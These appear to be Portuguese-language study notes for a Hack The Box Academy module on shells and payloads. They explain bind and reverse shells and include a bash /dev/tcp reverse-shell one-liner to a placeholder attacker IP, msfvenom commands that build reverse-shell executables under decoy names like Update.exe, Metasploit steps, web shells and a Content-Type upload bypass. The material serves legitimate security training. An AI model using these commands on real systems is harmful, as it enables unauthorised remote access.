#  Shells & Payloads - HTB Academy

Este repositório contém minhas anotações de estudo e write-ups do módulo **Shells & Payloads** da Hack The Box Academy. O foco é compreender como obter acesso remoto a sistemas (Windows e Linux) e como estabilizar esse acesso.

##  1. Conceitos Fundamentais

### O que é uma Shell?
É a interface que nos permite enviar comandos ao Sistema Operacional.
**Linux:** Bash, Sh, Zsh.
**Windows:** cmd.exe, PowerShell.

### O que é um Payload?
É o código malicioso executado no alvo para realizar uma ação (neste caso, nos dar uma shell).

---

## 🔗 2. Tipos de Conexão (Shells)

Existem duas formas principais de conectar a máquina atacante à vitima.

### A. Bind Shell (Conexão Direta)
O Alvo abre uma porta e espera a conexão.
* **Fluxo:** Atacante ➡️ Alvo.
* **Problema:** Bloqueado pela maioria dos firewalls de entrada.



**Comandos (Netcat):**
``bash
# No Alvo (Vítima)
nc -lvnp 7777

# No Atacante
nc -nv <IP_ALVO> 7777
B. Reverse Shell (Conexão Reversa)
O Atacante abre uma porta e o Alvo se conecta de volta.

Fluxo: Alvo ➡️ Atacante.

Vantagem: Bypassa firewalls, pois tráfego de saída (outbound) geralmente é liberado.

Comandos (Netcat):

Bash

# No Atacante (Ouvinte)
sudo nc -lvnp 443

# No Alvo (Execução do Payload)
bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1'
💣 3. Criando Payloads com MSFvenom
O MSFvenom é usado para gerar executáveis maliciosos quando não usamos exploits automáticos.

Staged vs Stageless
Staged (/): Envia um pequeno loader primeiro, que baixa o resto. (Ex: shell/reverse_tcp).

Stageless (_): Envia o código completo de uma vez. Mais estável. (Ex: shell_reverse_tcp).

Gerando Arquivos
Linux (.elf):

Bash

msfvenom -p linux/x64/shell_reverse_tcp LHOST=<SEU_IP> LPORT=443 -f elf > backup.elf
Windows (.exe):

Bash

msfvenom -p windows/shell_reverse_tcp LHOST=<SEU_IP> LPORT=443 -f exe > Update.exe
🦊 4. Metasploit Framework
Ferramenta para automatizar a exploração.

Comandos Essenciais:

Bash

sudo msfconsole                  # Iniciar
search <termo>                   # Procurar exploits (ex: eternalblue)
use <numero>                     # Selecionar exploit
show options                     # Ver configurações necessárias
set RHOSTS <IP_ALVO>             # Definir IP da vítima
set LHOST <SEU_IP>               # Definir seu IP (VPN)
exploit                          # Atacar
Meterpreter: Shell avançada do Metasploit que roda na memória. Para obter uma shell de sistema a partir dela, use o comando shell.

🛠️ 5. Estabilizando a Shell (Spawning TTY)
Shells obtidas via Netcat geralmente são "limitadas" (sem histórico, sem autocompletar, quebram com CTRL+C).

O Truque do Python (Essencial): Se a máquina tiver Python, rode isso para ganhar um terminal interativo completo:

Bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

# ou

python -c 'import pty; pty.spawn("/bin/sh")'
Outras opções:

Perl: perl -e 'exec "/bin/sh";'

Script: script /dev/null -c bash

6. Web Shells & Bypass
Uma Web Shell é um script (PHP, ASPX, JSP) que permite rodar comandos do sistema via navegador.

Ferramentas Nativas (Kali/Parrot)
Laudanum: /usr/share/laudanum (Várias linguagens)

Antak: /usr/share/nishang/Antak-WebShell (ASP.Net/PowerShell)

Bypass de Upload (Content-Type)
Muitos sites bloqueiam upload de .php mas aceitam imagens.

Interceptar a requisição com Burp Suite.

Mudar o Content-Type: application/x-php para Content-Type: image/gif.

Enviar o arquivo.

Acessar a URL para executar a shell.

7. Invasão por SO (Dicas Rápidas)

 Windows
Ping TTL: Geralmente 128.

Exploits comuns: EternalBlue (SMB), BlueKeep (RDP).

PowerShell: Mais poderoso que o CMD, mas deixa logs.

Linux
Ping TTL: Geralmente 64.

Exploits comuns: Web Apps vulneráveis (CMS), rConfig.

Privilégios: Sempre checar sudo -l após ganhar acesso.
